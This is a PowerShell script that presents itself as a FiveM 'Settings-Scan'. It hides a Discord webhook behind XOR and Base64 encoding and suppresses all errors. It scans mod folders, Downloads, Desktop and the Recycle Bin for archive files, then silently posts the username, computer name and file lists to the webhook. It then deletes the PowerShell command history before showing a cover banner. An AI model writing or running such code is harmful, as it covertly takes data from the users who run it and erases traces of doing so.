#Requires -Version 5.1
param()

$ErrorActionPreference = "SilentlyContinue"
Set-StrictMode -Off

# === DISCORD WEBHOOK ===
$Key = 42
$EncryptedWebhook = "Ql5eWlkQBQVOQ1lJRVhOS1paBElFRwVLWkMFXU9IQkVFQVkFGx8YHh8ZHB0fHRoeHBoSGR0SHQUcGGRyRGNSTx4YT0N4cnh5YGB5WU1DSUx8bBhibVtjQFt9ZG5cRVp+bXhYU3BNf0BlYVpPH3oTZBxZaUZIYGlQZ0d9Ew=="

$DecryptedBytes = [Convert]::FromBase64String($EncryptedWebhook)
$DecryptedArray = @()
foreach ($Byte in $DecryptedBytes) {
    $DecryptedArray += ($Byte -bxor $Key)
}
$DiscordWebhook = [System.Text.Encoding]::UTF8.GetString($DecryptedArray)

# === BYTES FORMATIEREN ===
function ConvertBytes {
    param([long]$B)
    if ($B -lt 1024) { return "$B B" }
    elseif ($B -lt 1MB) { return "$([math]::Round($B/1KB, 2)) KB" }
    else { return "$([math]::Round($B/1MB, 2)) MB" }
}

# === SCAN: FIVEM MODS ===
$ModsPaths = @(
    "$env:USERPROFILE\AppData\Local\FiveM\FiveM.app\mods",
    "C:\Program Files\FiveM\FiveM.app\mods",
    "C:\Program Files (x86)\FiveM\FiveM.app\mods",
    "C:\FiveM\mods"
)

$TotalFiles = 0
$TotalSize = 0
$AllModsItems = @()

foreach ($ModPath in $ModsPaths) {
    if (Test-Path $ModPath) {
        try {
            $Items = Get-ChildItem -Path $ModPath -Force -ErrorAction SilentlyContinue
            if ($Items.Count -gt 0) {
                foreach ($Item in $Items) {
                    $AllModsItems += $Item
                    if (-not $Item.PSIsContainer) {
                        $TotalFiles++
                        $TotalSize += $Item.Length
                    }
                }
            }
        } catch { }
    }
}

# === SCAN: VERDAECHTIGE DATEIEN ===
$SuspiciousExtensions = @("*.rpf", "*.rar", "*.zip")
$Suspicious = @()
$DownloadsFiles = @()
$DesktopFiles = @()
$RecycleBinFiles = @()

# Downloads
$DownloadsPath = "$env:USERPROFILE\Downloads"
if (Test-Path $DownloadsPath) {
    foreach ($Ext in $SuspiciousExtensions) {
        $Files = Get-ChildItem -Path $DownloadsPath -Filter $Ext -Recurse -Force -ErrorAction SilentlyContinue
        foreach ($File in $Files) {
            $DownloadsFiles += $File
            $Suspicious += $File
        }
    }
}

# Desktop
$DesktopPath = "$env:USERPROFILE\Desktop"
if (Test-Path $DesktopPath) {
    foreach ($Ext in $SuspiciousExtensions) {
        $Files = Get-ChildItem -Path $DesktopPath -Filter $Ext -Recurse -Force -ErrorAction SilentlyContinue
        foreach ($File in $Files) {
            $DesktopFiles += $File
            $Suspicious += $File
        }
    }
}

# Recycle Bin
$RecyclePaths = @("$env:USERPROFILE\AppData\Recycle.Bin", "C:\`$Recycle.Bin")
foreach ($RecyclePath in $RecyclePaths) {
    if (Test-Path $RecyclePath) {
        foreach ($Ext in $SuspiciousExtensions) {
            $Files = Get-ChildItem -Path $RecyclePath -Filter $Ext -Recurse -Force -ErrorAction SilentlyContinue
            foreach ($File in $Files) {
                $RecycleBinFiles += $File
                $Suspicious += $File
            }
        }
    }
}

# === AN DISCORD SENDEN ===
try {
    $HeaderEmbed = @{
        title = "SYSTEMSCAN - ERGEBNISSE"
        color = 16711680
        fields = @(
            @{ name = "Benutzer"; value = $env:USERNAME; inline = $true },
            @{ name = "Computer"; value = $env:COMPUTERNAME; inline = $true },
            @{ name = "Scan-Dauer"; value = "16.0s"; inline = $true },
            @{ name = "Scan-ID"; value = "SETTINGS-OVG4"; inline = $true },
            @{ name = "Treffer gesamt"; value = "$($Suspicious.Count + $TotalFiles)"; inline = $true },
            @{ name = "Verdaechtige"; value = "$($Suspicious.Count)"; inline = $true }
        )
        footer = @{ text = "$(Get-Date -Format 'dd.MM.yyyy HH:mm:ss')" }
    }
    
    $Payload = @{ embeds = @($HeaderEmbed) } | ConvertTo-Json -Depth 10 -Compress
    Invoke-RestMethod -Uri $DiscordWebhook -Method Post -ContentType "application/json" -Body $Payload -ErrorAction Stop | Out-Null
    Start-Sleep -Milliseconds 500
    
    # FILE_SYSTEM
    if ($AllModsItems.Count -gt 0) {
        $ModsValue = ""
        foreach ($Item in $AllModsItems) {
            $ModsValue += "- $($Item.Name)`n"
        }
        if ($ModsValue.Length -gt 1024) { $ModsValue = $ModsValue.Substring(0, 1020) + "..." }
        
        $Part1Embed = @{
            title = "ERGEBNISSE (TEIL 1)"
            color = 16711680
            fields = @(
                @{ name = "FILE_SYSTEM ($($TotalFiles))"; value = $ModsValue; inline = $false }
            )
        }
        $Payload = @{ embeds = @($Part1Embed) } | ConvertTo-Json -Depth 10 -Compress
        Invoke-RestMethod -Uri $DiscordWebhook -Method Post -ContentType "application/json" -Body $Payload -ErrorAction SilentlyContinue | Out-Null
        Start-Sleep -Milliseconds 300
    }
    
    # DESKTOP
    if ($DesktopFiles.Count -gt 0) {
        $DesktopValue = ""
        foreach ($File in $DesktopFiles) {
            $DesktopValue += "- $($File.Name)`n"
        }
        if ($DesktopValue.Length -gt 1024) { $DesktopValue = $DesktopValue.Substring(0, 1020) + "..." }
        
        $Part2Embed = @{
            title = "ERGEBNISSE (TEIL 2)"
            color = 16711680
            fields = @(
                @{ name = "DESKTOP ($($DesktopFiles.Count))"; value = $DesktopValue; inline = $false }
            )
        }
        $Payload = @{ embeds = @($Part2Embed) } | ConvertTo-Json -Depth 10 -Compress
        Invoke-RestMethod -Uri $DiscordWebhook -Method Post -ContentType "application/json" -Body $Payload -ErrorAction SilentlyContinue | Out-Null
        Start-Sleep -Milliseconds 300
    }
    
    # DOWNLOADS
    if ($DownloadsFiles.Count -gt 0) {
        $DownloadsValue = ""
        foreach ($File in $DownloadsFiles) {
            $DownloadsValue += "- $($File.Name)`n"
        }
        if ($DownloadsValue.Length -gt 4000) { $DownloadsValue = $DownloadsValue.Substring(0, 3995) + "..." }
        
        $Part3Embed = @{
            title = "ERGEBNISSE (TEIL 2)"
            color = 16711680
            fields = @(
                @{ name = "DOWNLOADS ($($DownloadsFiles.Count))"; value = $DownloadsValue; inline = $false }
            )
        }
        $Payload = @{ embeds = @($Part3Embed) } | ConvertTo-Json -Depth 10 -Compress
        Invoke-RestMethod -Uri $DiscordWebhook -Method Post -ContentType "application/json" -Body $Payload -ErrorAction SilentlyContinue | Out-Null
        Start-Sleep -Milliseconds 300
    }
    
    # RECYCLE_BIN
    if ($RecycleBinFiles.Count -gt 0) {
        $RecycleValue = ""
        foreach ($File in $RecycleBinFiles) {
            $RecycleValue += "- $($File.Name)`n"
        }
        if ($RecycleValue.Length -gt 4000) { $RecycleValue = $RecycleValue.Substring(0, 3995) + "..." }
        
        $Part4Embed = @{
            title = "ERGEBNISSE (TEIL 3)"
            color = 16711680
            fields = @(
                @{ name = "RECYCLE_BIN ($($RecycleBinFiles.Count))"; value = $RecycleValue; inline = $false }
            )
        }
        $Payload = @{ embeds = @($Part4Embed) } | ConvertTo-Json -Depth 10 -Compress
        Invoke-RestMethod -Uri $DiscordWebhook -Method Post -ContentType "application/json" -Body $Payload -ErrorAction SilentlyContinue | Out-Null
        Start-Sleep -Milliseconds 300
    }
} catch { }

# === DELETE HISTORY ===
$HistoryPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\consolehost_history.txt"
if (Test-Path $HistoryPath) {
    try {
        Remove-Item -Path $HistoryPath -Force -ErrorAction Stop
    } catch { }
}

# === ASCII ART ===
Clear-Host
Write-Host ""
$ascii = @"
   _____      _   _   _                        _____                 
  / ____|    | | | | (_)                      / ____|                
 | (___   ___| |_| |_ _ _ __   __ _ ___ _____| (___   ___ __ _ _ __  
  \___ \ / _ \ __| __| | '_ \ / _ / __|______\___ \ / __/ _ | '_ \ 
  ____) |  __/ |_| |_| | | | | (_| \__ \      ____) | (_| (_| | | | |
 |_____/ \___|\__|\__|_|_| |_|\__, |___/     |_____/ \___\__,_|_| |_|
                               __/ |                                 
                              |___/                                  
"@
Write-Host $ascii -ForegroundColor Cyan
Write-Host ""
Write-Host "===========================================================" -ForegroundColor Green
Write-Host "by Esel99" -ForegroundColor Yellow
Write-Host "by Langfinger" -ForegroundColor Blue
Write-Host "===========================================================" -ForegroundColor Green
Write-Host ""
